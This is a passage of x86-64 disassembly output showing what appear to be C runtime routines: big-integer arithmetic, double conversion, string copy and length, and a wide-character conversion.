   32c487a90:	bf 01 00 00 00       	mov    $0x1,%edi
   32c487a95:	b8 00 00 00 00       	mov    $0x0,%eax
   32c487a9a:	48 0f 49 d9          	cmovns %rcx,%rbx
   32c487a9e:	48 0f 49 f2          	cmovns %rdx,%rsi
   32c487aa2:	0f 49 f8             	cmovns %eax,%edi
   32c487aa5:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c487aa8:	e8 13 f7 ff ff       	call   0x32c4871c0
   32c487aad:	49 89 c1             	mov    %rax,%r9
   32c487ab0:	48 85 c0             	test   %rax,%rax
   32c487ab3:	0f 84 1a 01 00 00    	je     0x32c487bd3
   32c487ab9:	89 78 10             	mov    %edi,0x10(%rax)
   32c487abc:	48 63 43 14          	movslq 0x14(%rbx),%rax
   32c487ac0:	4c 8d 63 18          	lea    0x18(%rbx),%r12
   32c487ac4:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   32c487ac8:	49 8d 69 18          	lea    0x18(%r9),%rbp
   32c487acc:	45 31 c0             	xor    %r8d,%r8d
   32c487acf:	31 d2                	xor    %edx,%edx
   32c487ad1:	49 89 c2             	mov    %rax,%r10
   32c487ad4:	49 8d 3c 84          	lea    (%r12,%rax,4),%rdi
   32c487ad8:	48 63 46 14          	movslq 0x14(%rsi),%rax
   32c487adc:	4c 8d 2c 81          	lea    (%rcx,%rax,4),%r13
   32c487ae0:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c487ae7:	00 00 00 
   32c487aea:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487af1:	00 00 00 00 
   32c487af5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487afc:	00 00 00 00 
   32c487b00:	42 8b 44 03 18       	mov    0x18(%rbx,%r8,1),%eax
   32c487b05:	44 8b 19             	mov    (%rcx),%r11d
   32c487b08:	48 83 c1 04          	add    $0x4,%rcx
   32c487b0c:	4c 29 d8             	sub    %r11,%rax
   32c487b0f:	48 29 d0             	sub    %rdx,%rax
   32c487b12:	48 89 c2             	mov    %rax,%rdx
   32c487b15:	43 89 44 01 18       	mov    %eax,0x18(%r9,%r8,1)
   32c487b1a:	41 89 c3             	mov    %eax,%r11d
   32c487b1d:	49 83 c0 04          	add    $0x4,%r8
   32c487b21:	48 c1 ea 20          	shr    $0x20,%rdx
   32c487b25:	83 e2 01             	and    $0x1,%edx
   32c487b28:	4c 39 e9             	cmp    %r13,%rcx
   32c487b2b:	72 d3                	jb     0x32c487b00
   32c487b2d:	4c 89 e8             	mov    %r13,%rax
   32c487b30:	31 c9                	xor    %ecx,%ecx
   32c487b32:	48 29 f0             	sub    %rsi,%rax
   32c487b35:	48 83 c6 19          	add    $0x19,%rsi
   32c487b39:	48 83 e8 19          	sub    $0x19,%rax
   32c487b3d:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   32c487b41:	49 39 f5             	cmp    %rsi,%r13
   32c487b44:	48 0f 42 c1          	cmovb  %rcx,%rax
   32c487b48:	4c 8d 04 28          	lea    (%rax,%rbp,1),%r8
   32c487b4c:	49 8d 74 04 04       	lea    0x4(%r12,%rax,1),%rsi
   32c487b51:	4c 29 e5             	sub    %r12,%rbp
   32c487b54:	48 89 f1             	mov    %rsi,%rcx
   32c487b57:	4c 89 c0             	mov    %r8,%rax
   32c487b5a:	48 39 fe             	cmp    %rdi,%rsi
   32c487b5d:	73 55                	jae    0x32c487bb4
   32c487b5f:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487b66:	00 00 00 00 
   32c487b6a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487b71:	00 00 00 00 
   32c487b75:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487b7c:	00 00 00 00 
   32c487b80:	48 89 c8             	mov    %rcx,%rax
   32c487b83:	48 8d 1c 29          	lea    (%rcx,%rbp,1),%rbx
   32c487b87:	48 83 c1 04          	add    $0x4,%rcx
   32c487b8b:	8b 00                	mov    (%rax),%eax
   32c487b8d:	48 29 d0             	sub    %rdx,%rax
   32c487b90:	48 89 c2             	mov    %rax,%rdx
   32c487b93:	89 03                	mov    %eax,(%rbx)
   32c487b95:	41 89 c3             	mov    %eax,%r11d
   32c487b98:	48 c1 ea 20          	shr    $0x20,%rdx
   32c487b9c:	83 e2 01             	and    $0x1,%edx
   32c487b9f:	48 39 f9             	cmp    %rdi,%rcx
   32c487ba2:	72 dc                	jb     0x32c487b80
   32c487ba4:	48 83 ef 01          	sub    $0x1,%rdi
   32c487ba8:	48 29 f7             	sub    %rsi,%rdi
   32c487bab:	48 83 e7 fc          	and    $0xfffffffffffffffc,%rdi
   32c487baf:	49 8d 44 38 04       	lea    0x4(%r8,%rdi,1),%rax
   32c487bb4:	45 85 db             	test   %r11d,%r11d
   32c487bb7:	75 16                	jne    0x32c487bcf
   32c487bb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c487bc0:	8b 50 fc             	mov    -0x4(%rax),%edx
   32c487bc3:	48 83 e8 04          	sub    $0x4,%rax
   32c487bc7:	41 83 ea 01          	sub    $0x1,%r10d
   32c487bcb:	85 d2                	test   %edx,%edx
   32c487bcd:	74 f1                	je     0x32c487bc0
   32c487bcf:	45 89 51 14          	mov    %r10d,0x14(%r9)
   32c487bd3:	4c 89 c8             	mov    %r9,%rax
   32c487bd6:	48 83 c4 28          	add    $0x28,%rsp
   32c487bda:	5b                   	pop    %rbx
   32c487bdb:	5e                   	pop    %rsi
   32c487bdc:	5f                   	pop    %rdi
   32c487bdd:	5d                   	pop    %rbp
   32c487bde:	41 5c                	pop    %r12
   32c487be0:	41 5d                	pop    %r13
   32c487be2:	c3                   	ret
   32c487be3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487be8:	31 c9                	xor    %ecx,%ecx
   32c487bea:	e8 d1 f5 ff ff       	call   0x32c4871c0
   32c487bef:	49 89 c1             	mov    %rax,%r9
   32c487bf2:	48 85 c0             	test   %rax,%rax
   32c487bf5:	74 dc                	je     0x32c487bd3
   32c487bf7:	48 c7 40 14 01 00 00 	movq   $0x1,0x14(%rax)
   32c487bfe:	00 
   32c487bff:	4c 89 c8             	mov    %r9,%rax
   32c487c02:	48 83 c4 28          	add    $0x28,%rsp
   32c487c06:	5b                   	pop    %rbx
   32c487c07:	5e                   	pop    %rsi
   32c487c08:	5f                   	pop    %rdi
   32c487c09:	5d                   	pop    %rbp
   32c487c0a:	41 5c                	pop    %r12
   32c487c0c:	41 5d                	pop    %r13
   32c487c0e:	c3                   	ret
   32c487c0f:	90                   	nop
   32c487c10:	48 89 d8             	mov    %rbx,%rax
   32c487c13:	48 89 f3             	mov    %rsi,%rbx
   32c487c16:	48 89 c6             	mov    %rax,%rsi
   32c487c19:	e9 87 fe ff ff       	jmp    0x32c487aa5
   32c487c1e:	66 90                	xchg   %ax,%ax
   32c487c20:	57                   	push   %rdi
   32c487c21:	56                   	push   %rsi
   32c487c22:	53                   	push   %rbx
   32c487c23:	48 63 41 14          	movslq 0x14(%rcx),%rax
   32c487c27:	4c 8d 51 18          	lea    0x18(%rcx),%r10
   32c487c2b:	49 8d 1c 82          	lea    (%r10,%rax,4),%rbx
   32c487c2f:	44 8b 5b fc          	mov    -0x4(%rbx),%r11d
   32c487c33:	48 8d 73 fc          	lea    -0x4(%rbx),%rsi
   32c487c37:	41 0f bd cb          	bsr    %r11d,%ecx
   32c487c3b:	89 cf                	mov    %ecx,%edi
   32c487c3d:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c487c42:	83 f7 1f             	xor    $0x1f,%edi
   32c487c45:	41 89 c8             	mov    %ecx,%r8d
   32c487c48:	41 29 f8             	sub    %edi,%r8d
   32c487c4b:	44 89 02             	mov    %r8d,(%rdx)
   32c487c4e:	83 ff 0a             	cmp    $0xa,%edi
   32c487c51:	7e 7d                	jle    0x32c487cd0
   32c487c53:	44 8d 4f f5          	lea    -0xb(%rdi),%r9d
   32c487c57:	49 39 f2             	cmp    %rsi,%r10
   32c487c5a:	73 54                	jae    0x32c487cb0
   32c487c5c:	8b 53 f8             	mov    -0x8(%rbx),%edx
   32c487c5f:	45 85 c9             	test   %r9d,%r9d
   32c487c62:	74 53                	je     0x32c487cb7
   32c487c64:	44 29 c9             	sub    %r9d,%ecx
   32c487c67:	44 89 d8             	mov    %r11d,%eax
   32c487c6a:	89 d6                	mov    %edx,%esi
   32c487c6c:	41 89 c8             	mov    %ecx,%r8d
   32c487c6f:	44 89 c9             	mov    %r9d,%ecx
   32c487c72:	d3 e0                	shl    %cl,%eax
   32c487c74:	44 89 c1             	mov    %r8d,%ecx
   32c487c77:	d3 ee                	shr    %cl,%esi
   32c487c79:	44 89 c9             	mov    %r9d,%ecx
   32c487c7c:	09 f0                	or     %esi,%eax
   32c487c7e:	d3 e2                	shl    %cl,%edx
   32c487c80:	48 8d 4b f8          	lea    -0x8(%rbx),%rcx
   32c487c84:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   32c487c89:	48 c1 e0 20          	shl    $0x20,%rax
   32c487c8d:	49 39 ca             	cmp    %rcx,%r10
   32c487c90:	73 31                	jae    0x32c487cc3
   32c487c92:	44 8b 4b f4          	mov    -0xc(%rbx),%r9d
   32c487c96:	44 89 c1             	mov    %r8d,%ecx
   32c487c99:	41 d3 e9             	shr    %cl,%r9d
   32c487c9c:	44 09 ca             	or     %r9d,%edx
   32c487c9f:	48 09 d0             	or     %rdx,%rax
   32c487ca2:	66 48 0f 6e c0       	movq   %rax,%xmm0
   32c487ca7:	5b                   	pop    %rbx
   32c487ca8:	5e                   	pop    %rsi
   32c487ca9:	5f                   	pop    %rdi
   32c487caa:	c3                   	ret
   32c487cab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487cb0:	31 d2                	xor    %edx,%edx
   32c487cb2:	83 ff 0b             	cmp    $0xb,%edi
   32c487cb5:	75 59                	jne    0x32c487d10
   32c487cb7:	44 89 d8             	mov    %r11d,%eax
   32c487cba:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   32c487cbf:	48 c1 e0 20          	shl    $0x20,%rax
   32c487cc3:	48 09 d0             	or     %rdx,%rax
   32c487cc6:	66 48 0f 6e c0       	movq   %rax,%xmm0
   32c487ccb:	5b                   	pop    %rbx
   32c487ccc:	5e                   	pop    %rsi
   32c487ccd:	5f                   	pop    %rdi
   32c487cce:	c3                   	ret
   32c487ccf:	90                   	nop
   32c487cd0:	b9 0b 00 00 00       	mov    $0xb,%ecx
   32c487cd5:	44 89 d8             	mov    %r11d,%eax
   32c487cd8:	45 31 c0             	xor    %r8d,%r8d
   32c487cdb:	29 f9                	sub    %edi,%ecx
   32c487cdd:	d3 e8                	shr    %cl,%eax
   32c487cdf:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   32c487ce4:	48 c1 e0 20          	shl    $0x20,%rax
   32c487ce8:	49 39 f2             	cmp    %rsi,%r10
   32c487ceb:	73 07                	jae    0x32c487cf4
   32c487ced:	44 8b 43 f8          	mov    -0x8(%rbx),%r8d
   32c487cf1:	41 d3 e8             	shr    %cl,%r8d
   32c487cf4:	8d 4f 15             	lea    0x15(%rdi),%ecx
   32c487cf7:	44 89 da             	mov    %r11d,%edx
   32c487cfa:	d3 e2                	shl    %cl,%edx
   32c487cfc:	44 09 c2             	or     %r8d,%edx
   32c487cff:	48 09 d0             	or     %rdx,%rax
   32c487d02:	66 48 0f 6e c0       	movq   %rax,%xmm0
   32c487d07:	5b                   	pop    %rbx
   32c487d08:	5e                   	pop    %rsi
   32c487d09:	5f                   	pop    %rdi
   32c487d0a:	c3                   	ret
   32c487d0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487d10:	44 89 d8             	mov    %r11d,%eax
   32c487d13:	44 89 c9             	mov    %r9d,%ecx
   32c487d16:	31 d2                	xor    %edx,%edx
   32c487d18:	d3 e0                	shl    %cl,%eax
   32c487d1a:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   32c487d1f:	48 c1 e0 20          	shl    $0x20,%rax
   32c487d23:	48 09 d0             	or     %rdx,%rax
   32c487d26:	66 48 0f 6e c0       	movq   %rax,%xmm0
   32c487d2b:	5b                   	pop    %rbx
   32c487d2c:	5e                   	pop    %rsi
   32c487d2d:	5f                   	pop    %rdi
   32c487d2e:	c3                   	ret
   32c487d2f:	90                   	nop
   32c487d30:	56                   	push   %rsi
   32c487d31:	53                   	push   %rbx
   32c487d32:	48 83 ec 28          	sub    $0x28,%rsp
   32c487d36:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c487d3b:	4c 89 c3             	mov    %r8,%rbx
   32c487d3e:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   32c487d44:	48 89 d6             	mov    %rdx,%rsi
   32c487d47:	e8 74 f4 ff ff       	call   0x32c4871c0
   32c487d4c:	49 89 c0             	mov    %rax,%r8
   32c487d4f:	48 85 c0             	test   %rax,%rax
   32c487d52:	74 5c                	je     0x32c487db0
   32c487d54:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   32c487d59:	48 89 c1             	mov    %rax,%rcx
   32c487d5c:	48 c1 e9 20          	shr    $0x20,%rcx
   32c487d60:	89 ca                	mov    %ecx,%edx
   32c487d62:	c1 e9 14             	shr    $0x14,%ecx
   32c487d65:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
   32c487d6b:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
   32c487d71:	41 89 c9             	mov    %ecx,%r9d
   32c487d74:	74 4a                	je     0x32c487dc0
   32c487d76:	81 ca 00 00 10 00    	or     $0x100000,%edx
   32c487d7c:	85 c0                	test   %eax,%eax
   32c487d7e:	0f 85 c4 00 00 00    	jne    0x32c487e48
   32c487d84:	31 c9                	xor    %ecx,%ecx
   32c487d86:	41 c7 40 14 01 00 00 	movl   $0x1,0x14(%r8)
   32c487d8d:	00 
   32c487d8e:	b8 35 00 00 00       	mov    $0x35,%eax
   32c487d93:	f3 0f bc ca          	tzcnt  %edx,%ecx
   32c487d97:	d3 ea                	shr    %cl,%edx
   32c487d99:	44 8d 51 20          	lea    0x20(%rcx),%r10d
   32c487d9d:	41 89 50 18          	mov    %edx,0x18(%r8)
   32c487da1:	44 29 d0             	sub    %r10d,%eax
   32c487da4:	43 8d 94 11 cd fb ff 	lea    -0x433(%r9,%r10,1),%edx
   32c487dab:	ff 
   32c487dac:	89 16                	mov    %edx,(%rsi)
   32c487dae:	89 03                	mov    %eax,(%rbx)
   32c487db0:	4c 89 c0             	mov    %r8,%rax
   32c487db3:	48 83 c4 28          	add    $0x28,%rsp
   32c487db7:	5b                   	pop    %rbx
   32c487db8:	5e                   	pop    %rsi
   32c487db9:	c3                   	ret
   32c487dba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487dc0:	85 c0                	test   %eax,%eax
   32c487dc2:	75 3c                	jne    0x32c487e00
   32c487dc4:	31 c9                	xor    %ecx,%ecx
   32c487dc6:	41 c7 40 14 01 00 00 	movl   $0x1,0x14(%r8)
   32c487dcd:	00 
   32c487dce:	b8 20 00 00 00       	mov    $0x20,%eax
   32c487dd3:	f3 0f bc ca          	tzcnt  %edx,%ecx
   32c487dd7:	d3 ea                	shr    %cl,%edx
   32c487dd9:	44 8d 89 ee fb ff ff 	lea    -0x412(%rcx),%r9d
   32c487de0:	41 89 50 18          	mov    %edx,0x18(%r8)
   32c487de4:	0f bd d2             	bsr    %edx,%edx
   32c487de7:	44 89 0e             	mov    %r9d,(%rsi)
   32c487dea:	83 f2 1f             	xor    $0x1f,%edx
   32c487ded:	29 d0                	sub    %edx,%eax
   32c487def:	89 03                	mov    %eax,(%rbx)
   32c487df1:	4c 89 c0             	mov    %r8,%rax
   32c487df4:	48 83 c4 28          	add    $0x28,%rsp
   32c487df8:	5b                   	pop    %rbx
   32c487df9:	5e                   	pop    %rsi
   32c487dfa:	c3                   	ret
   32c487dfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487e00:	45 31 c9             	xor    %r9d,%r9d
   32c487e03:	f3 44 0f bc c8       	tzcnt  %eax,%r9d
   32c487e08:	45 85 c9             	test   %r9d,%r9d
   32c487e0b:	0f 85 9f 00 00 00    	jne    0x32c487eb0
   32c487e11:	41 89 40 18          	mov    %eax,0x18(%r8)
   32c487e15:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   32c487e19:	85 d2                	test   %edx,%edx
   32c487e1b:	0f 85 bf 00 00 00    	jne    0x32c487ee0
   32c487e21:	b8 01 00 00 00       	mov    $0x1,%eax
   32c487e26:	ba 01 00 00 00       	mov    $0x1,%edx
   32c487e2b:	41 89 40 14          	mov    %eax,0x14(%r8)
   32c487e2f:	89 d0                	mov    %edx,%eax
   32c487e31:	41 81 e9 32 04 00 00 	sub    $0x432,%r9d
   32c487e38:	41 8b 54 90 14       	mov    0x14(%r8,%rdx,4),%edx
   32c487e3d:	c1 e0 05             	shl    $0x5,%eax
   32c487e40:	eb a2                	jmp    0x32c487de4
   32c487e42:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487e48:	45 31 d2             	xor    %r10d,%r10d
   32c487e4b:	f3 44 0f bc d0       	tzcnt  %eax,%r10d
   32c487e50:	45 85 d2             	test   %r10d,%r10d
   32c487e53:	74 3b                	je     0x32c487e90
   32c487e55:	44 89 d1             	mov    %r10d,%ecx
   32c487e58:	41 89 d3             	mov    %edx,%r11d
   32c487e5b:	f7 d9                	neg    %ecx
   32c487e5d:	41 d3 e3             	shl    %cl,%r11d
   32c487e60:	44 89 d1             	mov    %r10d,%ecx
   32c487e63:	d3 e8                	shr    %cl,%eax
   32c487e65:	d3 ea                	shr    %cl,%edx
   32c487e67:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c487e6c:	44 09 d8             	or     %r11d,%eax
   32c487e6f:	83 fa 01             	cmp    $0x1,%edx
   32c487e72:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   32c487e76:	83 d9 ff             	sbb    $0xffffffff,%ecx
   32c487e79:	41 89 40 18          	mov    %eax,0x18(%r8)
   32c487e7d:	b8 35 00 00 00       	mov    $0x35,%eax
   32c487e82:	41 89 48 14          	mov    %ecx,0x14(%r8)
   32c487e86:	44 29 d0             	sub    %r10d,%eax
   32c487e89:	e9 16 ff ff ff       	jmp    0x32c487da4
   32c487e8e:	66 90                	xchg   %ax,%ax
   32c487e90:	41 89 40 18          	mov    %eax,0x18(%r8)
   32c487e94:	b8 35 00 00 00       	mov    $0x35,%eax
   32c487e99:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   32c487e9d:	41 c7 40 14 02 00 00 	movl   $0x2,0x14(%r8)
   32c487ea4:	00 
   32c487ea5:	e9 fa fe ff ff       	jmp    0x32c487da4
   32c487eaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487eb0:	41 89 d2             	mov    %edx,%r10d
   32c487eb3:	44 89 c9             	mov    %r9d,%ecx
   32c487eb6:	41 d3 ea             	shr    %cl,%r10d
   32c487eb9:	f7 d9                	neg    %ecx
   32c487ebb:	d3 e2                	shl    %cl,%edx
   32c487ebd:	44 89 c9             	mov    %r9d,%ecx
   32c487ec0:	45 89 50 1c          	mov    %r10d,0x1c(%r8)
   32c487ec4:	d3 e8                	shr    %cl,%eax
   32c487ec6:	09 c2                	or     %eax,%edx
   32c487ec8:	41 83 fa 01          	cmp    $0x1,%r10d
   32c487ecc:	19 c0                	sbb    %eax,%eax
   32c487ece:	41 89 50 18          	mov    %edx,0x18(%r8)
   32c487ed2:	83 c0 02             	add    $0x2,%eax
   32c487ed5:	48 63 d0             	movslq %eax,%rdx
   32c487ed8:	e9 4e ff ff ff       	jmp    0x32c487e2b
   32c487edd:	0f 1f 00             	nopl   (%rax)
   32c487ee0:	41 c7 40 14 02 00 00 	movl   $0x2,0x14(%r8)
   32c487ee7:	00 
   32c487ee8:	b8 40 00 00 00       	mov    $0x40,%eax
   32c487eed:	41 b9 ce fb ff ff    	mov    $0xfffffbce,%r9d
   32c487ef3:	e9 ec fe ff ff       	jmp    0x32c487de4
   32c487ef8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c487eff:	00 
   32c487f00:	48 89 c8             	mov    %rcx,%rax
   32c487f03:	0f b6 0a             	movzbl (%rdx),%ecx
   32c487f06:	88 08                	mov    %cl,(%rax)
   32c487f08:	84 c9                	test   %cl,%cl
   32c487f0a:	74 25                	je     0x32c487f31
   32c487f0c:	48 83 c2 01          	add    $0x1,%rdx
   32c487f10:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487f15:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487f1c:	00 00 00 00 
   32c487f20:	0f b6 0a             	movzbl (%rdx),%ecx
   32c487f23:	48 83 c0 01          	add    $0x1,%rax
   32c487f27:	48 83 c2 01          	add    $0x1,%rdx
   32c487f2b:	88 08                	mov    %cl,(%rax)
   32c487f2d:	84 c9                	test   %cl,%cl
   32c487f2f:	75 ef                	jne    0x32c487f20
   32c487f31:	c3                   	ret
   32c487f32:	90                   	nop
   32c487f33:	90                   	nop
   32c487f34:	90                   	nop
   32c487f35:	90                   	nop
   32c487f36:	90                   	nop
   32c487f37:	90                   	nop
   32c487f38:	90                   	nop
   32c487f39:	90                   	nop
   32c487f3a:	90                   	nop
   32c487f3b:	90                   	nop
   32c487f3c:	90                   	nop
   32c487f3d:	90                   	nop
   32c487f3e:	90                   	nop
   32c487f3f:	90                   	nop
   32c487f40:	45 31 c0             	xor    %r8d,%r8d
   32c487f43:	48 89 d0             	mov    %rdx,%rax
   32c487f46:	48 85 d2             	test   %rdx,%rdx
   32c487f49:	75 1e                	jne    0x32c487f69
   32c487f4b:	eb 27                	jmp    0x32c487f74
   32c487f4d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c487f54:	00 
   32c487f55:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487f5c:	00 00 00 00 
   32c487f60:	49 83 c0 01          	add    $0x1,%r8
   32c487f64:	4c 39 c0             	cmp    %r8,%rax
   32c487f67:	74 0b                	je     0x32c487f74
   32c487f69:	66 42 83 3c 41 00    	cmpw   $0x0,(%rcx,%r8,2)
   32c487f6f:	75 ef                	jne    0x32c487f60
   32c487f71:	4c 89 c0             	mov    %r8,%rax
   32c487f74:	c3                   	ret
   32c487f75:	90                   	nop
   32c487f76:	90                   	nop
   32c487f77:	90                   	nop
   32c487f78:	90                   	nop
   32c487f79:	90                   	nop
   32c487f7a:	90                   	nop
   32c487f7b:	90                   	nop
   32c487f7c:	90                   	nop
   32c487f7d:	90                   	nop
   32c487f7e:	90                   	nop
   32c487f7f:	90                   	nop
   32c487f80:	45 31 c0             	xor    %r8d,%r8d
   32c487f83:	48 89 c8             	mov    %rcx,%rax
   32c487f86:	48 85 d2             	test   %rdx,%rdx
   32c487f89:	75 24                	jne    0x32c487faf
   32c487f8b:	eb 27                	jmp    0x32c487fb4
   32c487f8d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c487f94:	00 
   32c487f95:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487f9c:	00 00 00 00 
   32c487fa0:	48 83 c0 01          	add    $0x1,%rax
   32c487fa4:	49 89 c0             	mov    %rax,%r8
   32c487fa7:	49 29 c8             	sub    %rcx,%r8
   32c487faa:	49 39 d0             	cmp    %rdx,%r8
   32c487fad:	73 05                	jae    0x32c487fb4
   32c487faf:	80 38 00             	cmpb   $0x0,(%rax)
   32c487fb2:	75 ec                	jne    0x32c487fa0
   32c487fb4:	4c 89 c0             	mov    %r8,%rax
   32c487fb7:	c3                   	ret
   32c487fb8:	90                   	nop
   32c487fb9:	90                   	nop
   32c487fba:	90                   	nop
   32c487fbb:	90                   	nop
   32c487fbc:	90                   	nop
   32c487fbd:	90                   	nop
   32c487fbe:	90                   	nop
   32c487fbf:	90                   	nop
   32c487fc0:	53                   	push   %rbx
   32c487fc1:	48 83 ec 20          	sub    $0x20,%rsp
   32c487fc5:	89 cb                	mov    %ecx,%ebx
   32c487fc7:	e8 94 04 00 00       	call   0x32c488460
   32c487fcc:	89 d9                	mov    %ebx,%ecx
   32c487fce:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
   32c487fd2:	48 c1 e2 04          	shl    $0x4,%rdx
   32c487fd6:	48 01 d0             	add    %rdx,%rax
   32c487fd9:	48 83 c4 20          	add    $0x20,%rsp
   32c487fdd:	5b                   	pop    %rbx
   32c487fde:	c3                   	ret
   32c487fdf:	90                   	nop
   32c487fe0:	57                   	push   %rdi
   32c487fe1:	56                   	push   %rsi
   32c487fe2:	53                   	push   %rbx
   32c487fe3:	48 83 ec 30          	sub    $0x30,%rsp
   32c487fe7:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   32c487fec:	48 89 cb             	mov    %rcx,%rbx
   32c487fef:	89 d6                	mov    %edx,%esi
   32c487ff1:	e8 5a 04 00 00       	call   0x32c488450
   32c487ff6:	89 c7                	mov    %eax,%edi
   32c487ff8:	e8 5b 04 00 00       	call   0x32c488458
   32c487ffd:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   32c488002:	0f b7 d6             	movzwl %si,%edx
   32c488005:	41 89 f9             	mov    %edi,%r9d
   32c488008:	89 44 24 20          	mov    %eax,0x20(%rsp)
   32c48800c:	48 89 d9             	mov    %rbx,%rcx
   32c48800f:	e8 6c 00 00 00       	call   0x32c488080
   32c488014:	48 83 c4 30          	add    $0x30,%rsp
   32c488018:	5b                   	pop    %rbx
   32c488019:	5e                   	pop    %rsi
   32c48801a:	5f                   	pop    %rdi
   32c48801b:	c3                   	ret
   32c48801c:	90                   	nop
   32c48801d:	90                   	nop
   32c48801e:	90                   	nop
   32c48801f:	90                   	nop
   32c488020:	55                   	push   %rbp
   32c488021:	57                   	push   %rdi
   32c488022:	56                   	push   %rsi
   32c488023:	53                   	push   %rbx
   32c488024:	48 83 ec 38          	sub    $0x38,%rsp
   32c488028:	48 8d 05 d1 7a 00 00 	lea    0x7ad1(%rip),%rax        # 0x32c48fb00
   32c48802f:	4d 85 c9             	test   %r9,%r9
   32c488032:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
   32c488037:	48 89 ce             	mov    %rcx,%rsi
   32c48803a:	48 89 d7             	mov    %rdx,%rdi
   32c48803d:	49 0f 45 c1          	cmovne %r9,%rax
   32c488041:	48 89 c3             	mov    %rax,%rbx
   32c488044:	e8 07 04 00 00       	call   0x32c488450
   32c488049:	89 c5                	mov    %eax,%ebp
   32c48804b:	e8 08 04 00 00       	call   0x32c488458
   32c488050:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   32c488054:	49 89 d9             	mov    %rbx,%r9
   32c488057:	48 89 fa             	mov    %rdi,%rdx
   32c48805a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   32c48805e:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   32c488063:	48 89 f1             	mov    %rsi,%rcx
   32c488066:	e8 55 01 00 00       	call   0x32c4881c0
   32c48806b:	48 83 c4 38          	add    $0x38,%rsp
   32c48806f:	5b                   	pop    %rbx
   32c488070:	5e                   	pop    %rsi
   32c488071:	5f                   	pop    %rdi
   32c488072:	5d                   	pop    %rbp
   32c488073:	c3                   	ret
   32c488074:	90                   	nop
   32c488075:	90                   	nop
   32c488076:	90                   	nop
   32c488077:	90                   	nop
   32c488078:	90                   	nop
   32c488079:	90                   	nop
   32c48807a:	90                   	nop
   32c48807b:	90                   	nop
   32c48807c:	90                   	nop
   32c48807d:	90                   	nop
   32c48807e:	90                   	nop
   32c48807f:	90                   	nop
   32c488080:	48 83 ec 68          	sub    $0x68,%rsp
   32c488084:	49 89 ca             	mov    %rcx,%r10
   32c488087:	66 89 54 24 78       	mov    %dx,0x78(%rsp)
   32c48808c:	44 89 c9             	mov    %r9d,%ecx
   32c48808f:	4d 85 d2             	test   %r10,%r10
   32c488092:	74 64                	je     0x32c4880f8
   32c488094:	4d 85 c0             	test   %r8,%r8
   32c488097:	74 0c                	je     0x32c4880a5
   32c488099:	45 8b 08             	mov    (%r8),%r9d
   32c48809c:	45 85 c9             	test   %r9d,%r9d
   32c48809f:	0f 85 0b 01 00 00    	jne    0x32c4881b0
   32c4880a5:	0f b7 44 24 78       	movzwl 0x78(%rsp),%eax
   32c4880aa:	66 85 c0             	test   %ax,%ax
   32c4880ad:	74 21                	je     0x32c4880d0
   32c4880af:	85 c9                	test   %ecx,%ecx
   32c4880b1:	75 5d                	jne    0x32c488110
   32c4880b3:	66 3d ff 00          	cmp    $0xff,%ax
   32c4880b7:	77 27                	ja     0x32c4880e0
   32c4880b9:	41 88 02             	mov    %al,(%r10)
   32c4880bc:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c4880c2:	4c 89 c0             	mov    %r8,%rax
   32c4880c5:	48 83 c4 68          	add    $0x68,%rsp
   32c4880c9:	c3                   	ret
   32c4880ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4880d0:	41 c6 02 00          	movb   $0x0,(%r10)
   32c4880d4:	eb e6                	jmp    0x32c4880bc
   32c4880d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4880dd:	00 00 00 
   32c4880e0:	e8 83 03 00 00       	call   0x32c488468
   32c4880e5:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
